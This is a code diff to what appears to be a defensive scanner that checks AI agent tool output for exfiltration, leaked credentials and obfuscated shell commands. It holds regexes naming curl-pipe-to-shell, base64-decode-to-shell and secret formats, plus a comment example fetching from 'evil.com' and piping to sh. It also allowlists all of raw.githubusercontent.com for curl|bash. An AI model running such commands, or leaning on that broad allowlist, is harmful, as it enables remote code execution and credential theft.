@@ -19,6 +19,7 @@ import re
 from typing import Optional
 
 from .models import PostActionFinding, PostActionResponseTier
+from .text_utils import normalize_text
 
 logger = logging.getLogger(__name__)
 
@@ -39,7 +40,8 @@ _INSTRUCTIONAL_MARKERS: list[re.Pattern] = [
 
 def detect_instructional_content(text: str) -> float:
     """Detect instructional/imperative content in tool output. Returns 0.0-1.0."""
-    count = sum(1 for p in _INSTRUCTIONAL_MARKERS if p.search(text))
+    normalized = normalize_text(text)
+    count = sum(1 for p in _INSTRUCTIONAL_MARKERS if p.search(normalized))
     return min(count / len(_INSTRUCTIONAL_MARKERS), 1.0)
 
 
@@ -65,7 +67,8 @@ EXFILTRATION_PATTERNS: list[re.Pattern] = [
 
 def detect_exfiltration(text: str) -> float:
     """Detect data exfiltration patterns. Returns 0.0-1.0."""
-    count = sum(1 for p in EXFILTRATION_PATTERNS if p.search(text))
+    normalized = normalize_text(text)
+    count = sum(1 for p in EXFILTRATION_PATTERNS if p.search(normalized))
     return min(count * 0.5, 1.0)
 
 
@@ -83,13 +86,26 @@ _SECRET_PATTERNS: list[re.Pattern] = [
         r"Authorization:\s+Bearer\s+[A-Za-z0-9._-]{20,}",
         r"DATABASE_URL\s*=\s*\S+://\S+:\S+@",
         r"OPENAI_API_KEY\s*=\s*sk-[A-Za-z0-9]{20,}",
+        # OpenAI API keys (context-constrained sk- / sk-proj- pattern)
+        r"(?:key|token|api_?key|secret)\s*[:=]\s*sk-(?:proj-)?[a-zA-Z0-9]{20,}",
+        # AWS access key IDs (IAM format)
+        r"AKIA[A-Z0-9]{16}",
+        # Slack tokens (bot, user, workspace, refresh)
+        r"xox[bprs]-[a-zA-Z0-9\-]{10,}",
+        # Feishu/Lark tokens (context-constrained to avoid bare t- FP)
+        r"(?:tenant_access_token|user_access_token|app_access_token)\s*[:=]\s*t-[a-zA-Z0-9]{20,}",
+        # Bearer tokens (word-boundary constrained)
+        r"(?:^|[\s,;\"'])Bearer\s+[a-zA-Z0-9._\-]{20,}",
+        # Ethereum private key (context-constrained to avoid SHA-256 FP)
+        r"(?:private[_\s-]?key|priv[_\s-]?key|wallet[_\s-]?key)\s*[:=]\s*['\"]?0x[a-fA-F0-9]{64}",
     ]
 ]
 
 
 def detect_secret_exposure(text: str) -> float:
     """Detect exposed secrets/credentials in tool output. Returns 0.0-1.0."""
-    count = sum(1 for p in _SECRET_PATTERNS if p.search(text))
+    normalized = normalize_text(text)
+    count = sum(1 for p in _SECRET_PATTERNS if p.search(normalized))
     return min(count * 0.5, 1.0)
 
 
@@ -97,14 +113,55 @@ def detect_secret_exposure(text: str) -> float:
 # Obfuscation detection
 # ---------------------------------------------------------------------------
 
-_OBFUSCATION_PATTERNS: list[re.Pattern] = [
-    re.compile(p, re.IGNORECASE) for p in [
-        r"base64\s+-d.*?\|.*?(bash|sh)",
-        r"eval.*base64",
-        r"\\x[0-9a-f]{2}",
-        r"\[::-1\]",
+# Safe URLs known to use curl|bash legitimately
+_SAFE_CURL_PIPE_DOMAINS: frozenset[str] = frozenset({
+    "brew.sh", "raw.githubusercontent.com",
+    "get.pnpm.io", "bun.sh", "sh.rustup.rs",
+    "get.docker.com", "install.python-poetry.org",
+})
+
+_OBFUSCATION_PATTERNS: list[tuple[re.Pattern, str]] = [
+    (re.compile(p, f), pid) for p, f, pid in [
+        # Decode + pipe to shell
+        (r"base64\s+(?:-d|--decode)\b.*\|\s*(?:sh|bash|zsh|dash|ksh)\b", re.I, "base64-pipe-exec"),
+        (r"xxd\s+-r\b.*\|\s*(?:sh|bash|zsh|dash|ksh)\b", re.I, "hex-pipe-exec"),
+        (r"printf\s+.*\\x[0-9a-f]{2}.*\|\s*(?:sh|bash|zsh|dash|ksh)\b", re.I, "printf-pipe-exec"),
+        (r"eval[\s(].*(?:base64|xxd|printf|decode)", re.I, "eval-decode"),  # NOTE: [\s(] not \s+
+        # Remote fetch + pipe to shell
+        (r"(?:curl|wget)\s+.*\|\s*(?:sh|bash|zsh|dash|ksh)\b", re.I, "curl-pipe-shell"),
+        # Process substitution from remote
+        (r"(?:bash|sh|zsh)\s+<\(\s*(?:curl|wget)\b", re.I, "process-sub-remote"),
+        # Heredoc execution
+        (r"(?:sh|bash|zsh)\s+<<-?\s*['\"]?[a-zA-Z_]", re.I, "heredoc-exec"),
+        # Escape sequence obfuscation
+        (r"\$'(?:[^']*\\[0-7]{3}){2,}", 0, "octal-escape"),
+        (r"\$'(?:[^']*\\x[0-9a-fA-F]{2}){2,}", 0, "hex-escape"),
+        # Scripting language with encoded execution
+        (r"(?:python[23]?|perl|ruby)\s+-[ec]\s+.*(?:base64|b64decode|decode|exec|eval)", re.I, "script-exec-encoded"),
+        # Variable expansion obfuscation (a=cu;b=rl;$a$b http://evil.com | sh)
+        # Requires execution indicators after expanded vars to reduce FP on normal shell
+        (r"(?:[a-zA-Z_]\w{0,2}=[^;\s]+\s*;\s*){2,}[^$]*\$(?:[a-zA-Z_]|\{[a-zA-Z_]).*?(?:\||>|;.*?sh\b|`|/tmp/|/dev/|https?://)", 0, "var-expansion"),
+        # Existing patterns preserved
+        (r"\[::-1\]", 0, "reverse-slice"),
+        (r"\\x[0-9a-f]{2}", re.I, "hex-char"),
     ]
 ]
+
+
+def _is_safe_curl_pipe(text: str) -> bool:
+    """Check if curl|bash pattern uses a known safe domain (exact match)."""
+    from urllib.parse import urlparse
+    urls = re.findall(r"https?://[^\s|]+", text)
+    if len(urls) != 1:
+        return False
+    try:
+        netloc = urlparse(urls[0]).netloc.split(":")[0]
+        return any(
+            netloc == domain or netloc.endswith("." + domain)
+            for domain in _SAFE_CURL_PIPE_DOMAINS
+        )
+    except Exception:
+        return False
 
 
 def _shannon_entropy(text: str) -> float:
@@ -123,11 +180,20 @@ def _shannon_entropy(text: str) -> float:
 
 def detect_obfuscation(text: str) -> float:
     """Detect obfuscated code patterns. Returns 0.0-1.0."""
-    pattern_score = sum(
-        1 for p in _OBFUSCATION_PATTERNS if p.search(text)
-    ) * 0.3
+    normalized = normalize_text(text)
+    hits = 0
+    for pat, pid in _OBFUSCATION_PATTERNS:
+        if pat.search(normalized):
+            if pid == "curl-pipe-shell" and _is_safe_curl_pipe(normalized):
+                continue
+            hits += 1
+    pattern_score = hits * 0.3
     entropy = _shannon_entropy(text)
-    entropy_score = min((entropy - 5.5) / 2.5, 0.5) if len(text) > 50 and entropy > 5.5 else 0.0
+    entropy_score = (
+        min((entropy - 5.5) / 2.5, 0.5)
+        if len(text) > 50 and entropy > 5.5
+        else 0.0
+    )
     return min(pattern_score + entropy_score, 1.0)
 
 
